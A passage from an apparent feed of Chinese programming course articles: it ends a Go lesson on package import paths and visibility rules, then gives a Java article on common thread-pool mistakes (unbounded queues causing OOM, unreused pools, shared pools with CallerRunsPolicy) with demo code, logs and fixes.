&lt;h3 id="2-代码包的导入路径总会与其所在目录的相对路径一致吗">&lt;strong>2. 代码包的导入路径总会与其所在目录的相对路径一致吗？&lt;/strong>&lt;/h3>
&lt;p>库源码文件 demo5_lib.go 所在目录的相对路径是&lt;code>puzzlers/article3/q2/lib&lt;/code>，而它却声明自己属于&lt;code>lib5&lt;/code>包。在这种情况下，该包的导入路径是&lt;code>puzzlers/article3/q2/lib&lt;/code>，还是&lt;code>puzzlers/article3/q2/lib5&lt;/code>？&lt;/p>
&lt;p>这个问题往往会让 Go 语言的初学者们困惑，就算是用 Go 开发过程序的人也不一定清楚。我们一起来看看。&lt;/p>
&lt;p>首先，我们在构建或者安装这个代码包的时候，提供给&lt;code>go&lt;/code>命令的路径应该是目录的相对路径，就像这样：&lt;/p>
&lt;pre>&lt;code>go install puzzlers/article3/q2/lib
&lt;/code>&lt;/pre>
&lt;p>该命令会成功完成。之后，当前工作区的 pkg 子目录下会产生相应的归档文件，具体的相对路径是:&lt;/p>
&lt;pre>&lt;code>pkg/darwin_amd64/puzzlers/article3/q2/lib.a
&lt;/code>&lt;/pre>
&lt;p>其中的&lt;code>darwin_amd64&lt;/code>就是我在讲工作区时提到的平台相关目录。可以看到，这里与源码文件所在目录的相对路径是对应的。&lt;/p>
&lt;p>为了进一步说明问题，我需要先对 demo5.go 做两个改动。第一个改动是，在以&lt;code>import&lt;/code>为前导的代码包导入语句中加入&lt;code>puzzlers/article3/q2/lib&lt;/code>，也就是试图导入这个代码包。&lt;/p>
&lt;p>第二个改动是，把对&lt;code>hello&lt;/code>函数的调用改为对&lt;code>lib.Hello&lt;/code>函数的调用。其中的&lt;code>lib.&lt;/code>叫做限定符，旨在指明右边的程序实体所在的代码包。不过这里与代码包导入路径的完整写法不同，只包含了路径中的最后一级&lt;code>lib&lt;/code>，这与代码包声明语句中的规则一致。&lt;/p>
&lt;p>现在，我们可以通过运行&lt;code>go run demo5.go&lt;/code>命令试一试。错误提示会类似于下面这种。&lt;/p>
&lt;pre>&lt;code>./demo5.go:5:2: imported and not used: &amp;quot;puzzlers/article3/q2/lib&amp;quot; as lib5
./demo5.go:16:2: undefined: lib
&lt;/code>&lt;/pre>
&lt;p>第一个错误提示的意思是，我们导入了&lt;code>puzzlers/article3/q2/lib&lt;/code>包，但没有实际使用其中的任何程序实体。这在 Go 语言中是不被允许的，在编译时就会导致失败。&lt;/p>
&lt;p>注意，这里还有另外一个线索，那就是&amp;quot;as lib5&amp;quot;。这说明虽然导入了代码包&lt;code>puzzlers/article3/q2/lib&lt;/code>，但是使用其中的程序实体的时候应该以&lt;code>lib5.&lt;/code>为限定符。这也就是第二个错误提示的原因了。Go 命令找不到&lt;code>lib.&lt;/code>这个限定符对应的代码包。&lt;/p>
&lt;p>为什么会是这样？根本原因就是，我们在源码文件中声明所属的代码包与其所在目录的名称不同。请记住，源码文件所在的目录相对于 src 目录的相对路径就是它的代码包导入路径，而实际使用其程序实体时给定的限定符要与它声明所属的代码包名称对应。&lt;/p>
&lt;p>有两个方式可以使上述构建成功完成。我在这里选择把 demo5_lib.go 文件中的代码包声明语句改为&lt;code>package lib&lt;/code>。理由是，为了不让该代码包的使用者产生困惑，我们总是应该让声明的包名与其父目录的名称一致。&lt;/p>
&lt;h3 id="3-什么样的程序实体才可以被当前包外的代码引用">&lt;strong>3. 什么样的程序实体才可以被当前包外的代码引用？&lt;/strong>&lt;/h3>
&lt;p>你可能会有疑问，我为什么要把 demo5_lib.go 文件中的那个函数名称&lt;code>hello&lt;/code>的首字母大写？实际上这涉及了 Go 语言中对于程序实体访问权限的规则。&lt;/p>
&lt;p>超级简单，名称的首字母为大写的程序实体才可以被当前包外的代码引用，否则它就只能被当前包内的其他代码引用。&lt;/p>
&lt;p>通过名称，Go 语言自然地把程序实体的访问权限划分为了包级私有的和公开的。对于包级私有的程序实体，即使你导入了它所在的代码包也无法引用到它。&lt;/p>
&lt;h3 id="4-对于程序实体还有其他的访问权限规则吗">&lt;strong>4. 对于程序实体，还有其他的访问权限规则吗？&lt;/strong>&lt;/h3>
&lt;p>答案是肯定的。在 Go 1.5 及后续版本中，我们可以通过创建&lt;code>internal&lt;/code>代码包让一些程序实体仅仅能被当前模块中的其他代码引用。这被称为 Go 程序实体的第三种访问权限：模块级私有。&lt;/p>
&lt;p>具体规则是，&lt;code>internal&lt;/code>代码包中声明的公开程序实体仅能被该代码包的直接父包及其子包中的代码引用。当然，引用前需要先导入这个&lt;code>internal&lt;/code>包。对于其他代码包，导入该&lt;code>internal&lt;/code>包都是非法的，无法通过编译。&lt;/p>
&lt;p>&amp;ldquo;Golang_Puzzlers&amp;quot;项目的&lt;code>puzzlers/article3/q4&lt;/code>包中有一个简单的示例，可供你查看。你可以改动其中的代码并体会&lt;code>internal&lt;/code>包的作用。&lt;/p>
&lt;h2 id="总结">&lt;strong>总结&lt;/strong>&lt;/h2>
&lt;p>我们在本篇文章中详细讨论了把代码从命令源码文件中拆分出来的方法，这包括拆分到其他库源码文件，以及拆分到其他代码包。&lt;/p>
&lt;p>这里涉及了几条重要的 Go 语言基本编码规则，即：代码包声明规则、代码包导入规则以及程序实体的访问权限规则。在进行模块化编程时，你必须记住这些规则，否则你的代码很可能无法通过编译。&lt;/p>
&lt;h2 id="思考题">&lt;strong>思考题&lt;/strong>&lt;/h2>
&lt;p>这次的思考题都是关于代码包导入的，如下。&lt;/p>
&lt;ol>
&lt;li>如果你需要导入两个代码包，而这两个代码包的导入路径的最后一级是相同的，比如：&lt;code>dep/lib/flag&lt;/code>和&lt;code>flag&lt;/code>，那么会产生冲突吗？&lt;/li>
&lt;li>如果会产生冲突，那么怎样解决这种冲突，有几种方式？&lt;/li>
&lt;/ol>
&lt;p>第一个问题比较简单，你一试便知。强烈建议你编写个例子，然后运行&lt;code>go&lt;/code>命令构建它，并看看会有什么样的提示。&lt;/p>
&lt;p>而第二个问题涉及了代码包导入语句的高级写法，你可能需要去查阅一下 Go 语言规范。不过也不难。你最多能想出几种解决办法呢？你可以给我留言，我们一起讨论。&lt;/p>
&lt;p>&lt;a href="https://github.com/hyper0x/Golang_Puzzlers">戳此查看 Go 语言专栏文章配套详细代码。&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/35/48/358e4e8578a706598e18a7dfed3ed648.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨线程池：业务代码最常用也最容易犯错的组件</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/03%E4%B8%A8%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E6%9C%80%E5%B8%B8%E7%94%A8%E4%B9%9F%E6%9C%80%E5%AE%B9%E6%98%93%E7%8A%AF%E9%94%99%E7%9A%84%E7%BB%84%E4%BB%B6/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/03%E4%B8%A8%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E6%9C%80%E5%B8%B8%E7%94%A8%E4%B9%9F%E6%9C%80%E5%AE%B9%E6%98%93%E7%8A%AF%E9%94%99%E7%9A%84%E7%BB%84%E4%BB%B6/</guid><description>
&lt;p>你好，我是朱晔。今天，我来讲讲使用线程池需要注意的一些问题。&lt;/p>
&lt;p>在程序中，我们会用各种池化技术来缓存创建昂贵的对象，比如线程池、连接池、内存池。一般是预先创建一些对象放入池中，使用的时候直接取出使用，用完归还以便复用，还会通过一定的策略调整池中缓存对象的数量，实现池的动态伸缩。&lt;/p>
&lt;p>由于线程的创建比较昂贵，随意、没有控制地创建大量线程会造成性能问题，因此短平快的任务一般考虑使用线程池来处理，而不是直接创建线程。&lt;/p>
&lt;p>今天，我们就针对线程池这个话题展开讨论，通过三个生产事故，来看看使用线程池应该注意些什么。&lt;/p>
&lt;h1 id="线程池的声明需要手动进行">线程池的声明需要手动进行&lt;/h1>
&lt;p>Java 中的 Executors 类定义了一些快捷的工具方法，来帮助我们快速创建线程池。《阿里巴巴 Java 开发手册》中提到，禁止使用这些方法来创建线程池，而应该手动 new ThreadPoolExecutor 来创建线程池。这一条规则的背后，是大量血淋淋的生产事故，最典型的就是 newFixedThreadPool 和 newCachedThreadPool，可能因为资源耗尽导致 OOM 问题。&lt;/p>
&lt;p>首先，我们来看一下 newFixedThreadPool 为什么可能会出现 OOM 的问题。&lt;/p>
&lt;p>我们写一段测试代码，来初始化一个单线程的 FixedThreadPool，循环 1 亿次向线程池提交任务，每个任务都会创建一个比较大的字符串然后休眠一小时：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;oom1&amp;#34;)
public void oom1() throws InterruptedException {
ThreadPoolExecutor threadPool = (ThreadPoolExecutor) Executors.newFixedThreadPool(1);
//打印线程池的信息，稍后我会解释这段代码
printStats(threadPool);
for (int i = 0; i &amp;lt; 100000000; i++) {
threadPool.execute(() -&amp;gt; {
String payload = IntStream.rangeClosed(1, 1000000)
.mapToObj(__ -&amp;gt; &amp;#34;a&amp;#34;)
.collect(Collectors.joining(&amp;#34;&amp;#34;)) + UUID.randomUUID().toString();
try {
TimeUnit.HOURS.sleep(1);
} catch (InterruptedException e) {
}
log.info(payload);
});
}
threadPool.shutdown();
threadPool.awaitTermination(1, TimeUnit.HOURS);
}
&lt;/code>&lt;/pre>&lt;p>执行程序后不久，日志中就出现了如下 OOM：&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;http-nio-45678-ClientPoller&amp;#34; java.lang.OutOfMemoryError: GC overhead limit exceeded
&lt;/code>&lt;/pre>&lt;p>翻看 newFixedThreadPool 方法的源码不难发现，线程池的工作队列直接 new 了一个 LinkedBlockingQueue，&lt;strong>而默认构造方法的 LinkedBlockingQueue 是一个 Integer.MAX_VALUE 长度的队列，可以认为是无界的&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>public static ExecutorService newFixedThreadPool(int nThreads) {
return new ThreadPoolExecutor(nThreads, nThreads,
0L, TimeUnit.MILLISECONDS,
new LinkedBlockingQueue&amp;lt;Runnable&amp;gt;());
}
public class LinkedBlockingQueue&amp;lt;E&amp;gt; extends AbstractQueue&amp;lt;E&amp;gt;
implements BlockingQueue&amp;lt;E&amp;gt;, java.io.Serializable {
...
/**
* Creates a {@code LinkedBlockingQueue} with a capacity of
* {@link Integer#MAX_VALUE}.
*/
public LinkedBlockingQueue() {
this(Integer.MAX_VALUE);
}
...
}
&lt;/code>&lt;/pre>&lt;p>虽然使用 newFixedThreadPool 可以把工作线程控制在固定的数量上，但任务队列是无界的。如果任务较多并且执行较慢的话，队列可能会快速积压，撑爆内存导致 OOM。&lt;/p>
&lt;p>我们再把刚才的例子稍微改一下，改为使用 newCachedThreadPool 方法来获得线程池。程序运行不久后，同样看到了如下 OOM 异常：&lt;/p>
&lt;pre tabindex="0">&lt;code>[11:30:30.487] [http-nio-45678-exec-1] [ERROR] [.a.c.c.C.[.[.[/].[dispatcherServlet]:175 ] - Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Handler dispatch failed; nested exception is java.lang.OutOfMemoryError: unable to create new native thread] with root cause
java.lang.OutOfMemoryError: unable to create new native thread
&lt;/code>&lt;/pre>&lt;p>从日志中可以看到，这次 OOM 的原因是无法创建线程，翻看 newCachedThreadPool 的源码可以看到，&lt;strong>这种线程池的最大线程数是 Integer.MAX_VALUE，可以认为是没有上限的，而其工作队列 SynchronousQueue 是一个没有存储空间的阻塞队列&lt;/strong>。这意味着，只要有请求到来，就必须找到一条工作线程来处理，如果当前没有空闲的线程就再创建一条新的。&lt;/p>
&lt;p>由于我们的任务需要 1 小时才能执行完成，大量的任务进来后会创建大量的线程。我们知道线程是需要分配一定的内存空间作为线程栈的，比如 1MB，因此无限制创建线程必然会导致 OOM：&lt;/p>
&lt;pre tabindex="0">&lt;code>public static ExecutorService newCachedThreadPool() {
return new ThreadPoolExecutor(0, Integer.MAX_VALUE,
60L, TimeUnit.SECONDS,
new SynchronousQueue&amp;lt;Runnable&amp;gt;());
&lt;/code>&lt;/pre>&lt;p>其实，大部分 Java 开发同学知道这两种线程池的特性，只是抱有侥幸心理，觉得只是使用线程池做一些轻量级的任务，不可能造成队列积压或开启大量线程。&lt;/p>
&lt;p>但，现实往往是残酷的。我之前就遇到过这么一个事故：用户注册后，我们调用一个外部服务去发送短信，发送短信接口正常时可以在 100 毫秒内响应，TPS 100 的注册量，CachedThreadPool 能稳定在占用 10 个左右线程的情况下满足需求。在某个时间点，外部短信服务不可用了，我们调用这个服务的超时又特别长， 比如 1 分钟，1 分钟可能就进来了 6000 用户，产生 6000 个发送短信的任务，需要 6000 个线程，没多久就因为无法创建线程导致了 OOM，整个应用程序崩溃。&lt;/p>
&lt;p>因此，&lt;strong>我同样不建议使用 Executors 提供的两种快捷的线程池，原因如下&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>我们需要根据自己的场景、并发情况来评估线程池的几个核心参数，包括核心线程数、最大线程数、线程回收策略、工作队列的类型，以及拒绝策略，确保线程池的工作行为符合需求，一般都需要设置有界的工作队列和可控的线程数。&lt;/li>
&lt;li>任何时候，都应该为自定义线程池指定有意义的名称，以方便排查问题。当出现线程数量暴增、线程死锁、线程占用大量 CPU、线程执行出现异常等问题时，我们往往会抓取线程栈。此时，有意义的线程名称，就可以方便我们定位问题。&lt;/li>
&lt;/ul>
&lt;p>除了建议手动声明线程池以外，我还建议&lt;strong>用一些监控手段来观察线程池的状态&lt;/strong>。线程池这个组件往往会表现得任劳任怨、默默无闻，除非是出现了拒绝策略，否则压力再大都不会抛出一个异常。如果我们能提前观察到线程池队列的积压，或者线程数量的快速膨胀，往往可以提早发现并解决问题。&lt;/p>
&lt;h1 id="线程池线程管理策略详解">线程池线程管理策略详解&lt;/h1>
&lt;p>在之前的 Demo 中，我们用一个 printStats 方法实现了最简陋的监控，每秒输出一次线程池的基本内部信息，包括线程数、活跃线程数、完成了多少任务，以及队列中还有多少积压任务等信息：&lt;/p>
&lt;pre tabindex="0">&lt;code>private void printStats(ThreadPoolExecutor threadPool) {
Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -&amp;gt; {
log.info(&amp;#34;=========================&amp;#34;);
log.info(&amp;#34;Pool Size: {}&amp;#34;, threadPool.getPoolSize());
log.info(&amp;#34;Active Threads: {}&amp;#34;, threadPool.getActiveCount());
log.info(&amp;#34;Number of Tasks Completed: {}&amp;#34;, threadPool.getCompletedTaskCount());
log.info(&amp;#34;Number of Tasks in Queue: {}&amp;#34;, threadPool.getQueue().size());
log.info(&amp;#34;=========================&amp;#34;);
}, 0, 1, TimeUnit.SECONDS);
}
&lt;/code>&lt;/pre>&lt;p>接下来，我们就利用这个方法来观察一下线程池的基本特性吧。&lt;/p>
&lt;p>首先，自定义一个线程池。这个线程池具有 2 个核心线程、5 个最大线程、使用容量为 10 的 ArrayBlockingQueue 阻塞队列作为工作队列，使用默认的 AbortPolicy 拒绝策略，也就是任务添加到线程池失败会抛出 RejectedExecutionException。此外，我们借助了 Jodd 类库的 ThreadFactoryBuilder 方法来构造一个线程工厂，实现线程池线程的自定义命名。&lt;/p>
&lt;p>然后，我们写一段测试代码来观察线程池管理线程的策略。测试代码的逻辑为，每次间隔 1 秒向线程池提交任务，循环 20 次，每个任务需要 10 秒才能执行完成，代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;right&amp;#34;)
public int right() throws InterruptedException {
//使用一个计数器跟踪完成的任务数
AtomicInteger atomicInteger = new AtomicInteger();
//创建一个具有2个核心线程、5个最大线程，使用容量为10的ArrayBlockingQueue阻塞队列作为工作队列的线程池，使用默认的AbortPolicy拒绝策略
ThreadPoolExecutor threadPool = new ThreadPoolExecutor(
2, 5,
5, TimeUnit.SECONDS,
new ArrayBlockingQueue&amp;lt;&amp;gt;(10),
new ThreadFactoryBuilder().setNameFormat(&amp;#34;demo-threadpool-%d&amp;#34;).get(),
new ThreadPoolExecutor.AbortPolicy());
printStats(threadPool);
//每隔1秒提交一次，一共提交20次任务
IntStream.rangeClosed(1, 20).forEach(i -&amp;gt; {
try {
TimeUnit.SECONDS.sleep(1);
} catch (InterruptedException e) {
e.printStackTrace();
}
int id = atomicInteger.incrementAndGet();
try {
threadPool.submit(() -&amp;gt; {
log.info(&amp;#34;{} started&amp;#34;, id);
//每个任务耗时10秒
try {
TimeUnit.SECONDS.sleep(10);
} catch (InterruptedException e) {
}
log.info(&amp;#34;{} finished&amp;#34;, id);
});
} catch (Exception ex) {
//提交出现异常的话，打印出错信息并为计数器减一
log.error(&amp;#34;error submitting task {}&amp;#34;, id, ex);
atomicInteger.decrementAndGet();
}
});
TimeUnit.SECONDS.sleep(60);
return atomicInteger.intValue();
}
&lt;/code>&lt;/pre>&lt;p>60 秒后页面输出了 17，有 3 次提交失败了：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/4b/2c/4b820e0b24ce0deefbf2dd7af295c32c.png" alt="">&lt;/p>
&lt;p>并且日志中也出现了 3 次类似的错误信息：&lt;/p>
&lt;pre tabindex="0">&lt;code>[14:24:52.879] [http-nio-45678-exec-1] [ERROR] [.t.c.t.demo1.ThreadPoolOOMController:103 ] - error submitting task 18
java.util.concurrent.RejectedExecutionException: Task java.util.concurrent.FutureTask@163a2dec rejected from java.util.concurrent.ThreadPoolExecutor@18061ad2[Running, pool size = 5, active threads = 5, queued tasks = 10, completed tasks = 2]
&lt;/code>&lt;/pre>&lt;p>我们把 printStats 方法打印出的日志绘制成图表，得出如下曲线：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/d8/1e/d819035f60bf1c0022a98051d50e031e.png" alt="">&lt;/p>
&lt;p>&lt;strong>至此，我们可以总结出线程池默认的工作行为&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>不会初始化 corePoolSize 个线程，有任务来了才创建工作线程；&lt;/li>
&lt;li>当核心线程满了之后不会立即扩容线程池，而是把任务堆积到工作队列中；&lt;/li>
&lt;li>当工作队列满了后扩容线程池，一直到线程个数达到 maximumPoolSize 为止；&lt;/li>
&lt;li>如果队列已满且达到了最大线程后还有任务进来，按照拒绝策略处理；&lt;/li>
&lt;li>当线程数大于核心线程数时，线程等待 keepAliveTime 后还是没有任务需要处理的话，收缩线程到核心线程数。&lt;/li>
&lt;/ul>
&lt;p>了解这个策略，有助于我们根据实际的容量规划需求，为线程池设置合适的初始化参数。当然，我们也可以通过一些手段来改变这些默认工作行为，比如：&lt;/p>
&lt;ul>
&lt;li>声明线程池后立即调用 prestartAllCoreThreads 方法，来启动所有核心线程；&lt;/li>
&lt;li>传入 true 给 allowCoreThreadTimeOut 方法，来让线程池在空闲的时候同样回收核心线程。&lt;/li>
&lt;/ul>
&lt;p>不知道你有没有想过：Java 线程池是先用工作队列来存放来不及处理的任务，满了之后再扩容线程池。当我们的工作队列设置得很大时，最大线程数这个参数显得没有意义，因为队列很难满，或者到满的时候再去扩容线程池已经于事无补了。&lt;/p>
&lt;p>那么，**我们有没有办法让线程池****更激进一点，优先开启更多的线程，而把队列当成一个后备方案呢？**比如我们这个例子，任务执行得很慢，需要 10 秒，如果线程池可以优先扩容到 5 个最大线程，那么这些任务最终都可以完成，而不会因为线程池扩容过晚导致慢任务来不及处理。&lt;/p>
&lt;p>限于篇幅，这里我只给你一个大致思路：&lt;/p>
&lt;ul>
&lt;li>由于线程池在工作队列满了无法入队的情况下会扩容线程池，那么我们是否可以重写队列的 offer 方法，造成这个队列已满的假象呢？&lt;/li>
&lt;li>由于我们 Hack 了队列，在达到了最大线程后势必会触发拒绝策略，那么能否实现一个自定义的拒绝策略处理程序，这个时候再把任务真正插入队列呢？&lt;/li>
&lt;/ul>
&lt;p>接下来，就请你动手试试看如何实现这样一个&amp;quot;弹性&amp;quot;线程池吧。Tomcat 线程池也实现了类似的效果，可供你借鉴。&lt;/p>
&lt;h1 id="务必确认清楚线程池本身是不是复用的">务必确认清楚线程池本身是不是复用的&lt;/h1>
&lt;p>不久之前我遇到了这样一个事故：某项目生产环境时不时有报警提示线程数过多，超过 2000 个，收到报警后查看监控发现，瞬时线程数比较多但过一会儿又会降下来，线程数抖动很厉害，而应用的访问量变化不大。&lt;/p>
&lt;p>为了定位问题，我们在线程数比较高的时候进行线程栈抓取，抓取后发现内存中有 1000 多个自定义线程池。一般而言，线程池肯定是复用的，有 5 个以内的线程池都可以认为正常，而 1000 多个线程池肯定不正常。&lt;/p>
&lt;p>在项目代码里，我们没有搜到声明线程池的地方，搜索 execute 关键字后定位到，原来是业务代码调用了一个类库来获得线程池，类似如下的业务代码：调用 ThreadPoolHelper 的 getThreadPool 方法来获得线程池，然后提交数个任务到线程池处理，看不出什么异常。&lt;/p>
&lt;pre tabindex="0">&lt;code>@GetMapping(&amp;#34;wrong&amp;#34;)
public String wrong() throws InterruptedException {
ThreadPoolExecutor threadPool = ThreadPoolHelper.getThreadPool();
IntStream.rangeClosed(1, 10).forEach(i -&amp;gt; {
threadPool.execute(() -&amp;gt; {
...
try {
TimeUnit.SECONDS.sleep(1);
} catch (InterruptedException e) {
}
});
});
return &amp;#34;OK&amp;#34;;
}
&lt;/code>&lt;/pre>&lt;p>但是，来到 ThreadPoolHelper 的实现让人大跌眼镜，&lt;strong>getThreadPool 方法居然是每次都使用 Executors.newCachedThreadPool 来创建一个线程池&lt;/strong>。&lt;/p>
&lt;pre tabindex="0">&lt;code>class ThreadPoolHelper {
public static ThreadPoolExecutor getThreadPool() {
//线程池没有复用
return (ThreadPoolExecutor) Executors.newCachedThreadPool();
}
}
&lt;/code>&lt;/pre>&lt;p>通过上一小节的学习，我们可以想到 newCachedThreadPool 会在需要时创建必要多的线程，业务代码的一次业务操作会向线程池提交多个慢任务，这样执行一次业务操作就会开启多个线程。如果业务操作并发量较大的话，的确有可能一下子开启几千个线程。&lt;/p>
&lt;p>那，为什么我们能在监控中看到线程数量会下降，而不会撑爆内存呢？&lt;/p>
&lt;p>回到 newCachedThreadPool 的定义就会发现，它的核心线程数是 0，而 keepAliveTime 是 60 秒，也就是在 60 秒之后所有的线程都是可以回收的。好吧，就因为这个特性，我们的业务程序死得没太难看。&lt;/p>
&lt;p>要修复这个 Bug 也很简单，使用一个静态字段来存放线程池的引用，返回线程池的代码直接返回这个静态字段即可。这里一定要记得我们的最佳实践，手动创建线程池。修复后的 ThreadPoolHelper 类如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>class ThreadPoolHelper {
private static ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor(
10, 50,
2, TimeUnit.SECONDS,
new ArrayBlockingQueue&amp;lt;&amp;gt;(1000),
new ThreadFactoryBuilder().setNameFormat(&amp;#34;demo-threadpool-%d&amp;#34;).get());
public static ThreadPoolExecutor getRightThreadPool() {
return threadPoolExecutor;
}
}
&lt;/code>&lt;/pre>&lt;h1 id="需要仔细斟酌线程池的混用策略">需要仔细斟酌线程池的混用策略&lt;/h1>
&lt;p>线程池的意义在于复用，那这是不是意味着程序应该始终使用一个线程池呢？&lt;/p>
&lt;p>当然不是。通过第一小节的学习我们知道，&lt;strong>要根据任务的&amp;quot;轻重缓急&amp;quot;来指定线程池的核心参数，包括线程数、回收策略和任务队列&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>对于执行比较慢、数量不大的 IO 任务，或许要考虑更多的线程数，而不需要太大的队列。&lt;/li>
&lt;li>而对于吞吐量较大的计算型任务，线程数量不宜过多，可以是 CPU 核数或核数 *2（理由是，线程一定调度到某个 CPU 进行执行，如果任务本身是 CPU 绑定的任务，那么过多的线程只会增加线程切换的开销，并不能提升吞吐量），但可能需要较长的队列来做缓冲。&lt;/li>
&lt;/ul>
&lt;p>之前我也遇到过这么一个问题，业务代码使用了线程池异步处理一些内存中的数据，但通过监控发现处理得非常慢，整个处理过程都是内存中的计算不涉及 IO 操作，也需要数秒的处理时间，应用程序 CPU 占用也不是特别高，有点不可思议。&lt;/p>
&lt;p>经排查发现，业务代码使用的线程池，还被一个后台的文件批处理任务用到了。&lt;/p>
&lt;p>或许是够用就好的原则，这个线程池只有 2 个核心线程，最大线程也是 2，使用了容量为 100 的 ArrayBlockingQueue 作为工作队列，使用了 CallerRunsPolicy 拒绝策略：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static ThreadPoolExecutor threadPool = new ThreadPoolExecutor(
2, 2,
1, TimeUnit.HOURS,
new ArrayBlockingQueue&amp;lt;&amp;gt;(100),
new ThreadFactoryBuilder().setNameFormat(&amp;#34;batchfileprocess-threadpool-%d&amp;#34;).get(),
new ThreadPoolExecutor.CallerRunsPolicy());
&lt;/code>&lt;/pre>&lt;p>这里，我们模拟一下文件批处理的代码，在程序启动后通过一个线程开启死循环逻辑，不断向线程池提交任务，任务的逻辑是向一个文件中写入大量的数据：&lt;/p>
&lt;pre tabindex="0">&lt;code>@PostConstruct
public void init() {
printStats(threadPool);
new Thread(() -&amp;gt; {
//模拟需要写入的大量数据
String payload = IntStream.rangeClosed(1, 1_000_000)
.mapToObj(__ -&amp;gt; &amp;#34;a&amp;#34;)
.collect(Collectors.joining(&amp;#34;&amp;#34;));
while (true) {
threadPool.execute(() -&amp;gt; {
try {
//每次都是创建并写入相同的数据到相同的文件
Files.write(Paths.get(&amp;#34;demo.txt&amp;#34;), Collections.singletonList(LocalTime.now().toString() + &amp;#34;:&amp;#34; + payload), UTF_8, CREATE, TRUNCATE_EXISTING);
} catch (IOException e) {
e.printStackTrace();
}
log.info(&amp;#34;batch file processing done&amp;#34;);
});
}
}).start();
}
&lt;/code>&lt;/pre>&lt;p>可以想象到，这个线程池中的 2 个线程任务是相当重的。通过 printStats 方法打印出的日志，我们观察下线程池的负担：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/49/55/49c132595db60f109530e0dec55ccd55.png" alt="">&lt;/p>
&lt;p>可以看到，**线程池的 2 个线程始终处于活跃状态，队列也基本处于打满状态。**因为开启了 CallerRunsPolicy 拒绝处理策略，所以当线程满载队列也满的情况下，任务会在提交任务的线程，或者说调用 execute 方法的线程执行，也就是说不能认为提交到线程池的任务就一定是异步处理的。如果使用了 CallerRunsPolicy 策略，那么有可能异步任务变为同步执行。从日志的第四行也可以看到这点。这也是这个拒绝策略比较特别的原因。&lt;/p>
&lt;p>不知道写代码的同学为什么设置这个策略，或许是测试时发现线程池因为任务处理不过来出现了异常，而又不希望线程池丢弃任务，所以最终选择了这样的拒绝策略。不管怎样，这些日志足以说明线程池是饱和状态。&lt;/p>
&lt;p>可以想象到，业务代码复用这样的线程池来做内存计算，命运一定是悲惨的。我们写一段代码测试下，向线程池提交一个简单的任务，这个任务只是休眠 10 毫秒没有其他逻辑：&lt;/p>
&lt;pre tabindex="0">&lt;code>private Callable&amp;lt;Integer&amp;gt; calcTask() {
return () -&amp;gt; {
TimeUnit.MILLISECONDS.sleep(10);
return 1;
};
}
@GetMapping(&amp;#34;wrong&amp;#34;)
public int wrong() throws ExecutionException, InterruptedException {
return threadPool.submit(calcTask()).get();
}
&lt;/code>&lt;/pre>&lt;p>我们使用 wrk 工具对这个接口进行一个简单的压测，可以看到 TPS 为 75，性能的确非常差。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/98/07/989f7ab383e59e21751adb77a9b53507.png" alt="">&lt;/p>
&lt;p>细想一下，问题其实没有这么简单。因为原来执行 IO 任务的线程池使用的是 CallerRunsPolicy 策略，所以直接使用这个线程池进行异步计算的话，&lt;strong>当线程池饱和的时候，计算任务会在执行 Web 请求的 Tomcat 线程执行，这时就会进一步影响到其他同步处理的线程，甚至造成整个应用程序崩溃&lt;/strong>。&lt;/p>
&lt;p>解决方案很简单，使用独立的线程池来做这样的&amp;quot;计算任务&amp;quot;即可。计算任务打了双引号，是因为我们的模拟代码执行的是休眠操作，并不属于 CPU 绑定的操作，更类似 IO 绑定的操作，如果线程池线程数设置太小会限制吞吐能力：&lt;/p>
&lt;pre tabindex="0">&lt;code>private static ThreadPoolExecutor asyncCalcThreadPool = new ThreadPoolExecutor(
200, 200,
1, TimeUnit.HOURS,
new ArrayBlockingQueue&amp;lt;&amp;gt;(1000),
new ThreadFactoryBuilder().setNameFormat(&amp;#34;asynccalc-threadpool-%d&amp;#34;).get());
@GetMapping(&amp;#34;right&amp;#34;)
public int right() throws ExecutionException, InterruptedException {
return asyncCalcThreadPool.submit(calcTask()).get();
}
&lt;/code>&lt;/pre>&lt;p>使用单独的线程池改造代码后再来测试一下性能，TPS 提高到了 1727：&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/c2/06/c21eed38ccd18758d38745dd09496a06.png" alt="">&lt;/p>
&lt;p>可以看到，盲目复用线程池混用线程的问题在于，别人定义的线程池属性不一定适合你的任务，而且混用会相互干扰。这就好比，我们往往会用虚拟化技术来实现资源的隔离，而不是让所有应用程序都直接使用物理机。&lt;/p>
